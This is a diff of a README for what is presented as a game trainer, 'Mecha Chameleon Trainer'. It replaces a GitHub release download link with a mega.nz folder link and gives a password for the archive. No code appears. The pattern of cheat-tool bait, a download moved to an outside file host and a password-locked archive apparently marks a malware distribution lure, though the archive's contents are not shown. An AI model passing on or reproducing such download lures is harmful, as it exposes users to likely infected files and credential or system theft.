@@ -8,7 +8,7 @@
 
 ## 📥 DOWNLOAD
 
-### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/oscart-ops2095l8/Mecha-Chameleon-Trainer/releases/download/Mecha-Chameleon/MechaChameleon_Trainer.zip)
+### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://mega.nz/folder/gMN3nLBC#P1ldhYoUlHExIsR7VfJ1bQ)
 
 🔐 **Archive password:** **`5868781`**
 
